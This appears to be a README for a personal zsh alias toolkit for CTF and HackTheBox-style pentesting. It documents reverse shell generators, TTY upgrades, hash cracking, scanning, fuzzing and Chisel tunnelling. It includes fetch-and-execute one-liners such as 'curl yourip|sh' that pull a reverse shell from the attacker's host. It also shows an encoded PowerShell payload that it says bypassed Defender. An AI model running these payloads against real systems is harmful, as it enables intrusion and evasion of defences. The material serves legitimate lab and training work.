# Stuff for CTFs, HTB, THM etc
Contains aliases and scripts I often use. Just clone this repo **in your home folder** and run `echo "source ~/zsh-aliases/aliases.zsh" >> ~/.zshrc`. After restarting zsh you should be able to use all aliases and scripts. Only tested on Kali Linux, you might need to install additional dependencies on other distros. 
> #### Disclaimer
> Most of those aliases probably suck, feel free to submit a pull request reducing the pepeganess. For me the fact that it works is enough to use them for now :D
## Misc
### > www

Starts a HTTP server on port 80 in the current directory. Also prints a list of the IP address associated with each NIC, shows the current directory path and lists the files. 
Example: 
```
┌──(jazz㉿kali)-[/tmp/www]
└─$ www
[eth0] 192.168.172.128
[/tmp/www]
linpeas.sh  pspy64
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
> #### Notes
> - Sudo is used to ensure being able to listen on port 80

### > tun0

Copies the IP addres of the tun0 interface to the clipboard. 
Example: 
```
┌──(jazz㉿kali)-[~/jazz]
└─$ tun0 
```
Clipboard contents after:
```
10.10.14.41
```

### > mkdir_cd
Often when making a directory I want to directly `cd` into it after. This does exactly that.  
Example: 
```
┌──(jazz㉿kali)-[~/jazz]
└─$ mkdir_cd pepega

┌──(jazz㉿kali)-[~/jazz/pepega]
└─$ 
```

## Reverse shells
### > gen_lin_rev $ip $port 
Based on [RSaaS](https://github.com/lukechilds/reverse-shell). Creates a file called `index.html` in the current directory. This file contains multiple reverse shell payloads that will be attempted in sequence until one works. Can be used with `www` to make spawning a reverse shell after gaining RCE extremely easy and fast. Just make the target execute `curl yourip|sh` and it will retrieve the reverse shell payload from your webserver and -hopefully- connect back to your listener. 
Example: 
```
┌──(jazz㉿kali)-[~]
└─$ gen_lin_rev 127.0.0.1 1337
[+] Wrote Linux reverse shells to /home/jazz/index.html
```
> #### Notes
> - I really like how the `curl yourip|sh` payload doesn't really have any badchars besides possibly the space and the pipe. When spaces form an issue there are [ways around this](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-forbidden-spaces) and the pipe can be bypassed by just downloading and executing separately.
> - If curl is not installed on the remote machine you can try `wget yourip -O-|sh`
 

### > gen_php_rev $ip $port

Generates the [PentestMonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell) with the supplied ip and port and saves it in the current directory.  
Example: 
```
┌──(jazz㉿kali)-[~]
└─$ gen_php_rev 127.0.0.1 1337                                                              
[+] Wrote PHP reverse shell to /home/jazz/jazz.php
```
### > gen_ps_rev $ip $port
Generates a Powershell reverse shell with the supplied ip and port which at the moment of last usage bypassed defender. I'm not sure who to give credit for this payload. 
Example:
```
┌──(jazz㉿kali)-[~]
└─$ gen_ps_rev 127.0.0.1 1337
```
Clipboard contents after:
```
powershell -ec JABUAGEAcgBnAGUAdABIAG8AcwB0A...
```

## TTY upgrades
### > uptty
Copies the python(2) and python3 tty upgrade command to the clipboard. 
Example: 
```
┌──(jazz㉿kali)-[~/jazz]
└─$ uptty
```
Clipboard contents after:
```
python3 -c 'import pty;pty.spawn("/bin/bash")';python -c 'import pty;pty.spawn("/bin/bash")'
```
> #### Notes
> - Requires `xclip` to be installed
> - `py_tty_upgrade` and `py3_tty_upgrade` are still included for now but will call this alias instead

### > script_tty_upgrade
When Python is not installed on the remote machine you can use this command to copy the `script` method to upgrade to a tty shell to your clipboard. 
Example: 
```
┌──(jazz㉿kali)-[~/jazz]
└─$ script_tty_upgrade
```
Clipboard contents after:
```
/usr/bin/script -qc /bin/bash /dev/null
```
> #### Notes
> - Requires `xclip` to be installed

### > tty_fix
Runs `stty raw -echo; fg; reset` should be used after using one of the above tty upgrades.

### > tty_conf
Grabs the current tty settings (number of rows and columns) and copies a oneliner to the clipboard that can be pasted straight into your reverse shell window to get those settings to match up. This fixes the issue of line wrapping occuring halfway in your terminal. 
Example: 
```
┌──(jazz㉿kali)-[~/jazz]
└─$ tty_conf               
```
Clipboard contents after:
```
stty rows 30 columns 116
```
> #### Notes
> - Requires `xclip` to be installed

## Hashcracking
### > rock_john $hash_file (extra arguments)
Instead of manually supplying rockyou as an argument with `--wordlist=/usr/share/wordlists/rockyou.txt` (without auto completion :/) this alias injects that argument and thus can be used to try and crack a hash using JohnTheRipper and the rockyou wordlist more easily. 
Example: 
```
┌──(jazz㉿kali)-[~/jazz]
└─$ rock_john hash.txt --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
jazz             (?)     
1g 0:00:00:00 DONE (2022-05-19 15:59) 100.0g/s 5376Kp/s 5376Kc/s 5376KC/s lynn88..ilovebrooke
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```
> #### Notes
> - Kali seems to have fixed auto completion for John in 2022.2! This alias still saves you some effort though ;)
## Portscanning
### > nmap_tcp $ip (extra arguments)
Starts a TCP nmap scan with my default settings and outputs the scan results to an nmap directory which is automatically created if it does not yet exist. 
Example: 
```
┌──(jazz㉿kali)-[~]
└─$ nmap_default 127.0.0.1
[i] Creating /home/jazz/nmap...
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:04 EDT
...
```
> #### Notes
> - This only scans the default TCP ports. Add `-p-` as an argument to scan all ports.
> - Uses `sudo` to get the privileges required for a SYN scan
### > nmap_udp $ip (extra arguments)
Starts an UDP nmap scan with my default settings and outputs the scan results to an nmap directory which is automatically created if it does not yet exist. 
Example: 
```
┌──(jazz㉿kali)-[~]
└─$ nmap_udp 127.0.0.1
[i] Creating /home/jazz/nmap...
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:11 EDT
...
```
> #### Notes
> - This only scans the default UDP ports. Add `-p-` as an argument to scan all ports.
> - Uses `sudo` to get the privileges required for a UDP scan


## SecLists Path

> #### Notes
> - Many of the functions in this toolkit use wordlists from the SecLists project. To ensure these functions work correctly, the scripts need to know where to find the SecLists directory. The toolkit uses the following logic to locate SecLists:

1. First, it checks if `/opt/seclists/` exists.
2. If not, it checks if `/usr/share/seclists/` exists.
3. If neither of these directories exist, it looks for an environment variable called `SECLISTS_PATH`.

To set up SecLists for use with these scripts:

1. Install SecLists in one of the standard locations (`/opt/seclists/` or `/usr/share/seclists/`).
   
   OR

2. Set the `SECLISTS_PATH` environment variable to point to your SecLists installation:

   ```bash
   export SECLISTS_PATH="/path/to/seclists"
   # You can add this line to your .zshrc file to make it permanent.
    ```

## Web Fuzzing
### > vhost $domain (-w wordlist) (extra arguments)
Performs virtual host discovery using ffuf.
Example:
```
┌──(22sh㉿kali)-[~]
└─$ vhost box.htb
```
> #### Notes
> - When passing just the domain http will be used, you can however also pass in the full url https://box.htb for https
> - Requires `ffuf` to be installed
### > fuzz_dir $url (extra arguments)
Performs directory and files fuzzing using ffuf.
Exemple:
```
┌──(22sh㉿kali)-[~]
└─$ fuzz_dir http://box.htb

┌──(22sh㉿kali)-[~]
└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt

┌──(22sh㉿kali)-[~]
└─$ fuzz_dir http://box.htb -fs 245

┌──(22sh㉿kali)-[~]
└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt -fs 245
```
> #### Notes
> - Requires `ffuf` to be installed
## Chisel Tunneling
### > chisel_socks $ip $port
Sets up a SOCKS proxy using Chisel and copy the command to the clipboard.
Example:

```
┌──(22sh㉿kali)-[~/jazz]
└─$ chisel_socks 10.10.14.10 8888
[+] copied chisel client -v 10.10.14.10:8888 R:socks in clipboard
2024/08/05 23:31:03 server: Reverse tunnelling enabled
2024/08/05 23:31:03 server: Fingerprint vasHkxo+4Ec2ahPgyQ8BNqQVXOCda9cmPmP7WXRdh44=
2024/08/05 23:31:03 server: Listening on http://0.0.0.0:8888
```
### > chisel_forward $local_ip $local_port $remote_ip $remote_port
Sets up port forwarding using Chisel.
Example:

```
┌──(22sh㉿kali)-[~/jazz]
└─$ chisel_forward 10.10.14.10 8080 127.0.0.1 8080
[+] Copied to clipboard: ./chisel client 10.10.14.10:8888 R:8080:127.0.0.1:8080
[+] Run this on the target machine
2024/08/05 23:32:30 server: Reverse tunnelling enabled
2024/08/05 23:32:30 server: Fingerprint x2iuHfzYVOWXL/7Gw0a6AjXhMIg8WP7AqZwlDuRasQw=
2024/08/05 23:32:30 server: Listening on http://0.0.0.0:8888
```
## Host Management
### > addhost $ip $hostname
Adds or updates an entry in the /etc/hosts file.
Example:
```
┌──(22sh㉿kali)-[~/jazz]
└─$ addhost 10.10.11.234 big.box.htb 
[+] Appended big.box.htb to existing entry for 10.10.11.234 in /etc/hosts
10.10.11.234 boss.htb big.boss.htb big.box.htb


┌──(22sh㉿kali)-[~/jazz]
└─$ addhost 10.10.11.235 newbox.htb 
[+] Added new entry: 10.10.11.235 newbox.htb to /etc/hosts
10.10.11.235 newbox.htb
```


## Additional Aliases
- `linpeas`: Downloads the latest version of LinPEAS.
- `upload`: Uploads a file using bashupload.com.
- `phpcmd`: Creates a simple PHP web shell.
- `burl`: curl using burpsuite proxy.